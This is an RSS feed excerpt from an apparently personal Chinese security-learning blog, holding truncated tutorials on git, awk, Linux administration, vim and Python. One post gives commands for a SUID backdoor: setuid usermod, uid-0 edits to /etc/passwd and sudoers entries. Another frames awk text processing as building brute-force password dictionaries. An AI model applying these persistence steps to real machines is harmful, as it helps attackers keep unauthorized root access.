      <description>0x00 创建仓库 0x01 克隆 0x02 仓库连接到远程服务器 # 若没有克隆现有仓库则可以连接远程仓库： git remote add origin git@github.com:reber-9/reber-9.com.git  0x03 .gitignore文件 0x04 添加和提交和推送 0x05 分支  切换分支后，分支的更改不会影响原来分支， 切换分支后，分支更改后需要add，然后commit git checkout -b test可以创建分支同时切换  0x06 更新和合并 git pull 可以同步github上的数据到本地 git merge test 可以将test分支的改动合并到当前分支  0x07 查看状态 git status  0x08 撤回 git reset HEAD # 上一次add的文件全部撤销 git log查看commit的id git reset --hard commit_id # 若未push,可回到上个commit处 git revert HEAD # 若push后,可撤销前一次 commit  0x09 多用户 如果有多个用户时可进行如下设置
$ ssh-keygen -t rsa -b 2048 -f id_rsa_github -C &amp;quot;123456@qq.</description>
    </item>
    
    <item>
      <title>Linux之文本处理软件awk</title>
      <link>http://wyb0.com/posts/2016/linux-text-processing-software-awk/</link>
      <pubDate>Wed, 20 Apr 2016 15:54:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-text-processing-software-awk/</guid>
      <description>awk默认是以行为单位处理文本的，对文本中的每一行都执行后面 &amp;ldquo;{ }&amp;rdquo; 中的语句。
0x00 awk  若有一个需要重新格式化的字典test.txt(用户名、密码、地址)：
xiaosan sadasdw jiaozuo 234wer asdfasd asdas 1111 aaaa cccc 2222 aaaa degd 1111 aaaa cccc 3333 aaaa dfger 21asd sdfsd sadasd dwqx asds sasdfcv  要求：
1.里面有重复数据，使用命令去重 2.提取出用户名和密码 每一行前面加上id数字，递增。 3.只提取出密码作为爆破字典 4.某些公司都是一个公司前缀+姓名简写，所以为用户名一栏全部改为uv_用户名 5.提取出密码一列，有些密码爆破成功率高，所以增加一列，标出密码出现次数   0x01 去重 $ cat test.txt | awk &#39;!a[$1]++&#39; $ cat test.txt | uniq #作用和上面命令相同 xiaosan sadasdw jiaozuo 234wer asdfasd asdas 1111 aaaa cccc 2222 aaaa degd 3333 aaaa dfger 21asd sdfsd sadasd dwqx asds sasdfcv  0x02 去重、添加id 一般字典不需要id、user、pass等标示符，这里只是为了便于观看 $ cat test.</description>
    </item>
    
    <item>
      <title>Linux之文本处理</title>
      <link>http://wyb0.com/posts/2016/linux-text-processing/</link>
      <pubDate>Wed, 20 Apr 2016 07:58:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-text-processing/</guid>
      <description>这里介绍3种方式：awk、grep、sed
0x00 awk处理文本(最常用) 作用：awk对数据以行分析并生成报告时显得很强大，它将行进行切片，再处理分开的切片，可对格式化的数据重新进行格式化 awk命令格式：awk [F filed-separator] &#39;commands&#39; input-fiel(s) 参数-F：可以添加任意的分割符，比较重要 awk工作流程是这样的： 读入有&#39;\n&#39;换行符分割的一条记录，然后将记录按-F指定的域分隔符划分域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是&amp;quot;空白键&amp;quot; 或 &amp;quot;[tab]键&amp;quot;。   入门示例：
[wyb@localhost temp]$ head -n 5 /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;{print $1}&#39; #输出第1列，域分隔符为： root bin daemon adm lp [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;{pri nt &amp;quot;id:&amp;quot;$1&amp;quot;\tshell:&amp;quot;$7}&#39; #输出第1、7列且给予列名 id:root shell:/bin/bash id:bin shell:/sbin/nologin id:daemon shell:/sbin/nologin id:adm shell:/sbin/nologin id:lp shell:/sbin/nologin [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;BEGIN {print &amp;quot;====begin=====&amp;quot;} {print &amp;quot;id:&amp;quot;$1&amp;quot;\tshell:&amp;quot;$7} END {print &amp;quot;====end====&amp;quot;}&#39; ====begin===== id:root shell:/bin/bash id:bin shell:/sbin/nologin id:daemon shell:/sbin/nologin id:adm shell:/sbin/nologin id:lp shell:/sbin/nologin ====end==== [wyb@localhost temp]$ awk -F: &#39;/root/&#39; /etc/passwd #搜索含有root关键字的所有行 root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin [wyb@localhost temp]$ awk -F: &#39;/root/{print $7}&#39; /etc/passwd #匹配root并输出对应shell /bin/bash /sbin/nologin [wyb@localhost temp]$ awk -F: &#39;/^root/&#39; /etc/passwd #匹配以root开头的行 root:x:0:0:root:/root:/bin/bash  内置变量：   ARGC&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令行参数个数 ARGV&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令行参数排列 ENVIRON&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;支持队列中系统环境变量的使用 FILENAME&amp;nbsp;&amp;nbsp;&amp;nbsp;awk浏览的文件名 FNR&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;浏览文件的记录数 FS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;设置输入域分隔符，等价于命令行 -F选项 NF&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;浏览记录的域的个数 NR&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;已读的记录数 OFS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;输出域分隔符 ORS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;输出记录分隔符 RS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;控制记录分隔符</description>
    </item>
    
    <item>
      <title>Linux之安装ettercap</title>
      <link>http://wyb0.com/posts/2016/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-install-ettercap/</guid>
      <description>0x00 准备 操作系统：CentOS 首先，ettercap安装时需要4个依赖包，而且安装包里面也已经提供了 执行：sudo yum groupinstall &amp;quot;Development tools&amp;quot; #源码安装软件就需要安装这个 使用wget下载ettercap源码  0x01 查看需要的依赖项 [wyb@localhost ettercap-0.8.2]$ vim INSTALL #### Bundled libraries Ettercap now bundles the following libraries with the source distribution: libnet 1.1.6 curl 7.41.0 luajit 2.0.3 check 0.9.14 [wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ [wyb@localhost bundled_deps]$ ls check curl libnet luajit  0x02 安装依赖包  安装check
[wyb@localhost check]$ cd check-0.9.14 [wyb@localhost check-0.9.14]$ ls [wyb@localhost check-0.9.14]$ ./configure [wyb@localhost check-0.9.14]$ make [wyb@localhost check-0.</description>
    </item>
    
    <item>
      <title>Linux之软件的安装</title>
      <link>http://wyb0.com/posts/2016/linux-software-installation/</link>
      <pubDate>Tue, 19 Apr 2016 19:07:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-software-installation/</guid>
      <description>Linux上的软件安装可以分为三种方式：
0x00 yum安装 yum基于RPM包管理，一次性安装所有依赖包，提供了查找、安装、删除一个、一组 至全部软件包的命令，配置文件在/etc/yum.repos.d/下 主要命令： yum install gcc g++ yum remove wget yum list installed //显示已经安装过的软件 yum list //显示所有可以安装的包  
[wyb@localhost ~]$ wget -h //验证有没有安装wget -bash: /usr/bin/wget: No such file or directory [wyb@localhost ~]$ sudo yum search wget //通过yum查找wget，看有没有这个软件包 Loaded plugins: fastestmirror, refresh-packagekit, security Loading mirror speeds from cached hostfile * base: mirrors.yun-idc.com * extras: mirrors.pubyun.com * updates: mirrors.yun-idc.com ============================== N/S Matched: wget =============================== wget.x86_64 : A utility for retrieving files using the HTTP or FTP protocols Name and summary matches only, use &amp;quot;search all&amp;quot; for everything.</description>
    </item>
    
    <item>
      <title>Linux之基础命令</title>
      <link>http://wyb0.com/posts/2016/linux-basic-command/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-basic-command/</guid>
      <description>0x00 ls：显示文件 [wyb@localhost tmp]$ ls a a.txt [wyb@localhost tmp]$ ls -l total 4 drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a -rw-r--r--. 1 wyb root 0 Apr 17 18:23 a.txt [wyb@localhost tmp]$ ls -a . .. a a.txt .esd-500 .ICE-unix [wyb@localhost tmp]$ ls -al total 20 drwxrwxrwt. 5 root root 4096 Apr 17 18:23 . dr-xr-xr-x. 22 root root 4096 Apr 17 16:31 .. drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a -rw-r--r--.</description>
    </item>
    
    <item>
      <title>Linux之服务和计划任务</title>
      <link>http://wyb0.com/posts/2016/linux-service-and-planning-tasks/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-service-and-planning-tasks/</guid>
      <description>0x00 服务： 在后台运行的软件就叫服务，参数一般为：start/stop/restart
 apache启动后默认降权
service httpd start实际调用的是/etc/init.d/httpd这个shell脚本 而/etc/init.d是软连接文件夹，实际在/etc/rc.d/init.d [wyb@localhost ~]$ ls -al /etc/init.d lrwxrwxrwx. 1 root root 11 Apr 11 02:54 /etc/init.d -&amp;gt; rc.d/init.d  添加服务
将脚本放在/etc/init.d/下即可
 若要自启则
chkconfig --list //查看chk管理的自启动项 chkconfig --add httpd 添加到chk管理里面 chkconfig --del httpd 将httpd移出chk管理 chkcofnig --level 35 httpd on init的345将开启 chkcofnig --level 345 httpd off /etc/rc.d/rc3.d和rc5.d里将有httpd   0x01 计划任务 系统启动时将有一个脚本将cron服务开启，启动后cron命令会搜索全局型配置文件/etc/crontab和位于/var/spool/corn目录下以用户名命名的文件
cron每分钟醒来依次查看当前是否有需要运行的命令，最小单位就是分钟
任务格式：分(0-59) 时 日 月 周(0-6) 命令
 添加任务第一种方法  crontab -e //任何权限都可以运行这个命令，针对某个用户 [wyb@localhost spool]$ crontab -e //进入编辑，实际是写入到/var/spool/cron/username这个文件中 no crontab for wyb - using an empty one */1 * * * * date &amp;gt;&amp;gt; /tmp/date.</description>
    </item>
    
    <item>
      <title>Linux之SUID后门</title>
      <link>http://wyb0.com/posts/2016/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
 vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
 vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证</description>
    </item>
    
    <item>
      <title>Linux之用户和用户组</title>
      <link>http://wyb0.com/posts/2016/linux-user/</link>
      <pubDate>Sun, 17 Apr 2016 20:48:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-user/</guid>
      <description> 0x01 新建用户 环境：Ubuntu 14.04.4
 Step1：添加新用户
useradd -r -m -s /bin/bash 用户名
 Step2:配置新用户密码
passwd 用户名
 Step3：给新添加的用户增加root权限
visudo
然后添加：
用户名 ALL=(ALL:ALL) ALL
 ctrl+o 保存 ctrl+x 退出
  0x01 用户组 初始组只有一个就是/etc/passwd里gid显示的，有效组可以有多个  useradd xm 用户xm会默认加到xm组 useradd -g fans xm 将xm的所属组改为fans useradd -G fans xm 初始组为xm，有效组为fans  useradd xiaoming usermod -g fans xiaoming 只有一个初始组，被修改为fans useradd xm usermod -G fans xm xm用户会有两个组，初始组为xm，又添加一个有效组fans usermod -G fans1 xm xm用户两个组，初始组为xm，有效组更改为fans1  用户创建的文件拥有者是初始组  </description>
    </item>
    
    <item>
      <title>Linux之网络配置</title>
      <link>http://wyb0.com/posts/2016/linux-network-configuration/</link>
      <pubDate>Sun, 17 Apr 2016 17:58:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-network-configuration/</guid>
      <description>0x00 第一种方法 1. 启动网卡： $ ifconfig eth0 up/down 2. 配置ip： $ ifconfig eth0 192.168.22.231 netmask 255.255.255.0 3. 配置网关： $ route add default gw 192.168.22.1 4. 配DNS： $ vim /etc/resolv.conf $ echo &amp;quot;nameserver 114.114.114.114&amp;quot; &amp;gt; /etc/resolv.cof 5. 重启网络使配置生效： 6. 用文件配置ip信息 $ /etc/sysconfig/network-scripts/ifcfg-eth0 ps:添加静态路由 route add -net 10.211.55.0 netmask 255.255.255.0 dev eth3 //添加静态路由添加网络10.211.55.0，从eth0出去  0x01 第二种方法 打开文件/etc/sysconfig/network-scripts/ifcfg-eth0,在里面添加相应信息:
DEVICE=ethl ONBOOT=yes BOOTPROTO=static IPADDR= NETMASK= GATEWAY=  0x02 打开ip转发 echo &amp;quot;1&amp;quot; &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward 或者vim /etc/sysctl.</description>
    </item>
    
    <item>
      <title>[转]短</title>
      <link>http://wyb0.com/posts/2016/short/</link>
      <pubDate>Sun, 17 Apr 2016 15:49:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/short/</guid>
      <description>短 俄罗斯某诗人


一天很短 短得来不及拥抱清晨 就已经手握黄昏 
一年很短 短得来不及细品初春殷红窦绿 就要打点素裹秋霜 
一生很短 短的来不及享用美好年华 就已经身处迟暮 
总是经过的太快 领悟的太晚 我们要学会珍惜 珍惜人生路上的亲情、友情、同事情、同学情、朋友情 一旦擦身而过 也许永不邂逅</description>
    </item>
    
    <item>
      <title>Linux之权限</title>
      <link>http://wyb0.com/posts/2016/linux-permission-settings/</link>
      <pubDate>Sun, 17 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-permission-settings/</guid>
      <description>主要有三种参数：rwx 对于文件来说：分别是读/写/执行
对于目录来说：r读目录结构；w操作目录结构；x进入目录
如：drwxr&amp;ndash;r&amp;ndash; 3 root root 4096 Jun 25 08:35 .ssh
若账号vbird不属于root群组，则vbird可以查询此目录下的文件名，没有x权限所以不能切换到此目录中
0x00 文件权限  chmod -x
[root@localhost tmp]# ls -l total 0 -rwxrwxrwx. 1 root root 0 Apr 16 20:32 a.txt [root@localhost tmp]# chmod -x a.txt 去除ugo的x权限 [root@localhost tmp]# ls -l total 0 -rw-rw-rw-. 1 root root 0 Apr 16 20:32 a.txt [root@localhost tmp]# ls -l a.txt -rwxrw-rw-. 1 root root 9 Apr 16 20:42 a.txt [root@localhost tmp]# cat a.</description>
    </item>
    
    <item>
      <title>Linux之vim</title>
      <link>http://wyb0.com/posts/2016/linux-vim/</link>
      <pubDate>Fri, 15 Apr 2016 21:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-vim/</guid>
      <description>0x00 Vim的安装及配置：  安装vim  yum install vim   配置文件的位置  在目录 /etc/ 下面，有个名为vimrc的 文件， 这是系统中公共的vim配置文件，对所有用户都有效。   设置语法高亮显示  1) 打开vimrc，添加以下语句来使得语法高亮显示： syntax on 2) 如果此时语法还是没有高亮显示，那么在/etc目录下的profile文件中添加以下语句： export TERM=xterm-color   设置Windows风格的C/C++自动缩进（添加以下set语句到vimrc中）  1）设置Tab为4个空格 set tabstop=4 #设定tab长度为4 set softtabstop=4 #使按退格键时可以一次删除4个空格 set shiftwidth=4 #表示每一级缩进的长度，一般设置成跟softtabstop一样 set expandtab/noexpandtab #缩进用空格/制表符表示 2）自动缩进 set autoindent/noautoindent #设置每行的缩进值与上一行相等/不相等(我未启用) 3）使用 C/C++ 语言的自动缩进方式 set cindent 4）在左侧显示文本的行号 set nu 5）搜索设置 set incsearch #输入搜索内容时就显示搜索结果 set hlsearch #搜索时高亮显示被找到的文本 6）如果没有下列语句，就加上吧 if &amp;amp;term==&amp;quot;xterm&amp;quot; set t_Co=8 set t_Sb=^[[4%dm set t_Sf=^[[3%dm endif  0x01 Vim编辑器的三种模式  命令行模式  $vim 文件名 #直接进入命令行模式 Ctrl+ZZ#可保存文件 5dd/4yy#剪切5行/复制4行 p #粘贴到当前行后面 u #一直点的话会一直撤销，直到回复到文件最初状态 gg/G #光标移动到首行/末行 H/M/L #光标移动到屏幕显示的首行/中间/末行 0/$ #光标移动到行首/行尾 w/b #光标跳到下一个/上一个单词 o #在下一行插入 Ctrl+g #显示文本的信息 dt% #删除所有内容直到遇到 % d0/d$或D #删除从光标到行首/行尾的字符 3dw #删除3个单词 v+方向键 #可以从当前光标向各方向选择字符或行 4+向下的方向键 #光标向下移动4行 /和？#向下和向上搜索   末行模式  :wq #推出并保存 :wq!</description>
    </item>
    
    <item>
      <title>About</title>
      <link>http://wyb0.com/about/</link>
      <pubDate>Tue, 12 Apr 2016 23:46:56 +0800</pubDate>
      
      <guid>http://wyb0.com/about/</guid>
      <description> E-mail  reber0#163.com  WeChat and QQ    About me  网络安全爱好者 不断学习 努力工作  About this site  从2015年5月6日开始陆续写博客 博客主要用于记录自己的一些学习笔记之类的东西，供自己学习参考使用 博客部分内容是长时间积累的，所以来源难以查找，如果侵权请与我联系  </description>
    </item>
    
    <item>
      <title>Markdown简单语法</title>
      <link>http://wyb0.com/posts/2016/markdown-coding-syle/</link>
      <pubDate>Tue, 12 Apr 2016 01:01:01 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/markdown-coding-syle/</guid>
      <description> 0x00 标题 0x01 列表 0x02 引用 0x03 图片和链接 网络图片引用：
![Mou icon](http://mouapp.com/Mou_128.png) 本地图片引用：
![Logo](/img/logo.png) 图片链接：
[![](http://wyb0.com/img/logo.png)](http://wyb0.com/img/logo.png) 
链接：
[百度一下](http://www.baidu.com &amp;quot;点击去百度&amp;quot;) 百度一下
自动链接：
&amp;lt;http://www.baidu.com&amp;gt; http://www.baidu.com
新标签打开(部分平台不识别)：
[百度一下](http://www.baidu.com){:target=&amp;quot;_blank&amp;quot;}
也可用{:width=&amp;ldquo;300&amp;rdquo; height=&amp;ldquo;100&amp;rdquo;}来设置图片大小(部分平台不识别)
0x04 粗体与斜体 0x05 表格 0x06 代码块 行内代码块：使用两个Esc按键下的符号`将代码包裹起来即可
代码块：在代码左侧加4个空格即可(tab键缩进也行) 0x07 线 0x08 字体、字号和颜色设置 </description>
    </item>
    
    <item>
      <title>2016计划</title>
      <link>http://wyb0.com/posts/2016/2016-plan/</link>
      <pubDate>Mon, 11 Apr 2016 15:46:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/2016-plan/</guid>
      <description> 4月到10月好好参加培训 </description>
    </item>
    
    <item>
      <title>Python的正则</title>
      <link>http://wyb0.com/posts/2016/python-regular/</link>
      <pubDate>Fri, 05 Feb 2016 11:38:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-regular/</guid>
      <description> 0x00 正则表达式 正则表达式是用来匹配字符串的异常强大的东西，可以用来匹配邮箱、域名等字符串
0x01 符号 0x02 特殊字符 0x03 常用的模块属性 0x04 re模块 由于Pyton的字符串本身也用\转义，强烈建议使用r前缀
 函数match()
这个函数会尝试从字符串起始位置匹配一个模式，未匹配到则返回None  函数search()
这个函数会扫描整个字符串并返回第一个成功的匹配，未匹配到则返回None  函数findall()和finditer()
re.findall()将以列表的形式返回所有能匹配到的字符
re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数sub()
这个函数会对字符串进行匹配，然后替换，可以指定替换次数  函数split()
这个函数会以正则来分割字符串，以列表样式返回  函数compile()
这个函数可以编译正则，提高匹配速度   0x05 提取子串 根据正则可以匹配字符然后提取出来，用括号表示要提取的分组 0x06 贪婪匹配 正则表达式默认贪婪匹配，会尽可能的多匹配字符，一般就是用&amp;rdquo;？&amp;rdquo;来抑制贪婪匹配 </description>
    </item>
    
    <item>
      <title>Python的线程</title>
      <link>http://wyb0.com/posts/2016/python-thread/</link>
      <pubDate>Wed, 03 Feb 2016 12:44:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-thread/</guid>
      <description>Python的参数传递其实传递的是对象，当传递可变对象(列表、队列)时相当于引用传递，可以修改对象的原始值，当传递不可变对象(字符串、整型)时就相当于传值，不能直接修改原始对象。
0x00 单线程 #!/usr/bin/env python # -*- coding: utf-8 -*- from time import time,ctime,sleep def music(arg): for x in range(2): print &amp;quot;I&#39;m listening to %s. %s&amp;quot; % (arg,ctime()) sleep(1) def movie(arg): for x in range(2): print &amp;quot;I&#39;m watching %s. %s&amp;quot; % (arg,ctime()) sleep(5) if __name__ == &#39;__main__&#39;: start = int(time()) music(u&#39;我&#39;) movie(u&#39;可是&#39;) print &amp;quot;All over time:%s&amp;quot; % ctime() print &amp;quot;Used time:%d&amp;quot; % int(time()-start)  0x01 多线程 #!/usr/bin/env python # -*- coding: utf-8 -*- import re import requests import threading from time import time,ctime,sleep INDEX = 0 def http_get(sites): global INDEX while INDEX &amp;lt; len(sites): url = sites[INDEX] INDEX += 1 resp = requests.</description>
    </item>
    
    <item>
      <title>Python的IO操作</title>
      <link>http://wyb0.com/posts/2016/python-io-operation/</link>
      <pubDate>Sun, 31 Jan 2016 12:27:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-io-operation/</guid>
      <description>0x00 文件的操作  文件读写  r读取；rb可以读取二进制文件(如图片、视频)；w可覆盖写入；a+可追加写入
#!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;) data = f.read() print &amp;quot;File name: &amp;quot;,f.name print &amp;quot;File open moudle: &amp;quot;,f.mode print &amp;quot;File is close ?&amp;quot;,f.closed print &amp;quot;File content: &amp;quot;,data finally: f.close() with open(&amp;quot;test.txt&amp;quot;,&amp;quot;a+&amp;quot;) as f: #自动调用close() data = &amp;quot;\nYes,I know.&amp;quot; f.write(data) print u&amp;quot;写入内容：%s&amp;quot; % data with open(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;) as f: #readlines()一次读取一行，返回一个列表，也可以用read(size)读取指定大小 line = f.readlines() print line   指针移动  #!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&amp;quot;test.</description>
    </item>
    
    <item>
      <title>Python的面向对象</title>
      <link>http://wyb0.com/posts/2016/python-object-oriented/</link>
      <pubDate>Mon, 25 Jan 2016 11:17:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-object-oriented/</guid>
      <description>0x00 面向对象  面向对象是为了解决系统的可维护性，可扩展性，可重用性
 三个基本特征：封装、继承、多态
 封装：对一类事物，将其相同特点和功能提取出来，所共有的特点叫做属性，共有的功能就叫做方法，将属性和方法组合在一起就叫做封装。
如：人具有姓名、年龄、性别，这些就是属性，人可以说话、可以走、可以跑，这些就是方法，封装起来就是一个类，而类的实例化就是对象
 继承：继承可以使得子类具有父类的属性和方法，不需要再次编写相同的代码，子类可以对继承的代码进行重写，也可以追加新的属性和方法。
如：有一个类People，教师就可以继承自People，可以添加自己的属性，如：工资、职工号，也可以添加自己的方法，如：备课、写教案
 多态：首先，多态必有继承，没有继承就没有多态，继承后一个父类的引用变量可以指向其任意一个子类对象。
如：有一个People类，它的子类可以有学生、老师、工人，有多种形态，这就是多态
   0x01 类的实例 注意：类中每个方法后面都要写self，self就是当前对象指针
 示例一  #!/usr/bin/env python # -*- coding:utf-8 -*- # 声明一个People类 class People(object): &amp;quot;&amp;quot;&amp;quot;docstring for People&amp;quot;&amp;quot;&amp;quot; def __init__(self, name, age): super(People, self).__init__() self.name = name self.age = age def running(self): print &amp;quot;%s is running&amp;quot; % self.name def print_base_msg(self): print &amp;quot;Name:%s Age:%d&amp;quot; % (self.name,self.age) # 继承自People类 class Teacher(People): &amp;quot;&amp;quot;&amp;quot;docstring for Teacher&amp;quot;&amp;quot;&amp;quot; def __init__(self, name, age, salary): super(Teacher, self).</description>
    </item>
    
    <item>
      <title>Python的函数式编程</title>
      <link>http://wyb0.com/posts/2016/python-functional-programming/</link>
      <pubDate>Thu, 21 Jan 2016 21:13:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-functional-programming/</guid>
      <description>0x00 函数式编程 首先说一下高阶函数，能将函数作为参数来接收的函数就可以称为高阶函数，如下：
def add(x,y,f): return f(x) + f(y) print add(7,-3,abs) #abs是求绝对值的函数，这里返回的值为10  将函数作为参数传入，这样的函数就是高阶函数，而函数式编程就是指这种抽象程度很高的编程范式。
函数式编程的一个特点就是可以将函数作为参数，还允许返回一个函数。
纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。
允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。
0x01 高阶函数  map()函数
map接收两个参数，一个是函数，一个是列表(list)，map将函数依次作用到list的每个元素，然后返回新的list  def f(x): return x*x print map(f,[1,2,3,4]) #返回[1,4,9,16] print map(str,[1,2,3,4]) # 返回[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;]   reduce()函数
reduce接收参数和map一样(但传入的函数必须接收两个参数)，reduce会对list的每个元素反复调用函数，然后返回最终值  def f(x,y): return x*y print reduce(f,[1,2,3,4]) #1*2*3*4，返回24   filter()函数
filter也接收函数和list，函数会对list的每个元素进行判断然后返回True或False，为True的组成新list返回  def f(x): return x &amp;gt; 3 print filter(f,[1,2,3,4,5]) #返回[4,5]   sorted()函数
Python内置的函数sorted()可以对list进行排序  sorted([34,2,345,3]) #返回[2,3,34,345]  sorted也是一个高阶函数，当然也可以接收函数和参数。通常规定，对于两个元素x和y，若认为x &amp;lt; y则返回-1，若认为x == y则返回0，若认为x &amp;gt; y则返回1，从而进行正向排序</description>
    </item>
    
    <item>
      <title>Python的数据类型</title>
      <link>http://wyb0.com/posts/2016/python-type-of-data/</link>
      <pubDate>Tue, 19 Jan 2016 13:47:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-type-of-data/</guid>
      <description>0x00 特点及差别 常见4种数据类型：list、tuple、dict、set list即列表，它内部是有序的，可以添加、更新、删除元素 tuple是元组，它的内部也是有序的，但一般不可更新、删除，即内部元素不可变 dict即字典，它的内部无序，key不可变、不可重复，key值可更新，可删除键值对 set可用作求交集、并集等，它的内部无序，key不可变、不可重复，可添加和删除  0x01 操作示例 #!/usr/bin/env python # -*- coding: utf-8 -*- ####################################### print &#39;-----list-----&#39; L = [] #这样就可以声明一个list了 n = 1 while n &amp;lt;= 9: L.append(n) #添加 n = n + 2 print L #[1,3,5,7,9] L[len(L)-1] = 11 #更新 print L #[1,3,5,7,11] L.pop() #删除,和L.pop(-1)一样 L.pop(-2) print L #[1,3,7] L.insert(1,&#39;jack&#39;) for x in range(len(L)): print L[x], #逗号可抑制换行，结果为 1 jack 3 7 print &#39;\n-----list-----\n&#39; ####################################### print &#39;-----tuple-----&#39; T =(&#39;Michael&#39;,&#39;Bob&#39;,&#39;Tracy&#39;) print T #[&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;] for x in range(len(T)): print T[x], # Michael Bob Tracy print &#39;\n-----tuple-----\n&#39; ####################################### print &#39;-----dict-----&#39; D = {&#39;Adam&#39;:95,&#39;Lisa&#39;:90,&#39;Bart&#39;:75} print D #{&#39;Lisa&#39;: 90, &#39;Adam&#39;: 